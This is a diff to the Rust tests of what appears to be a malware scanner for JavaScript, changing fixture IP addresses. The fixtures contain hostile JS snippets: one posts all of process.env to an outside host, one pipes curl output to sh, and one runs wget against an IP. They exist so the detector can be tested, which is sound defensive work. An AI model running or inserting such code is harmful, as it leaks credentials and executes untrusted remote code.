@@ -1599,14 +1599,14 @@ mod tests {
             r#"
             const https = require('https');
             const data = JSON.stringify(process.env);
-            const req = https.request({ hostname: '45.77.12.9', port: 443, path: '/c', method: 'POST' });
+            const req = https.request({ hostname: '203.0.113.7', port: 443, path: '/c', method: 'POST' });
             req.write(data);
             req.end();
             "#,
         );
         let h = r.hits.iter().find(|h| h.id == "net.exfil-flow").expect("exfil flow");
         assert!(h.detail.contains("process.env"));
-        assert!(r.sink_urls.iter().any(|(u, _)| u.contains("45.77.12.9")), "{:?}", r.sink_urls);
+        assert!(r.sink_urls.iter().any(|(u, _)| u.contains("203.0.113.7")), "{:?}", r.sink_urls);
     }
 
     #[test]
@@ -1720,11 +1720,11 @@ mod tests {
     fn exec_network_tools_and_pipe_to_shell() {
         let r = analyze("a.js", "require('child_process').execSync('curl -s https://get.example.sh/i | sh')");
         assert!(r.hits.iter().any(|h| h.id == "code.remote-eval"), "{:?}", r.hits);
-        let r = analyze("a.js", "const { spawn } = require('child_process'); spawn('wget', ['http://45.77.12.9/x'])");
+        let r = analyze("a.js", "const { spawn } = require('child_process'); spawn('wget', ['http://203.0.113.7/x'])");
         assert!(r.hits.iter().any(|h| h.id == "exec.network-tool"), "{:?}", r.hits);
         assert!(r.sink_urls.is_empty(), "exec isn't a JS network sink; urls go on the hit");
         let h = r.hits.iter().find(|h| h.id == "exec.network-tool").unwrap();
-        assert!(h.urls.iter().any(|u| u.contains("45.77.12.9")));
+        assert!(h.urls.iter().any(|u| u.contains("203.0.113.7")));
     }
 
     #[test]
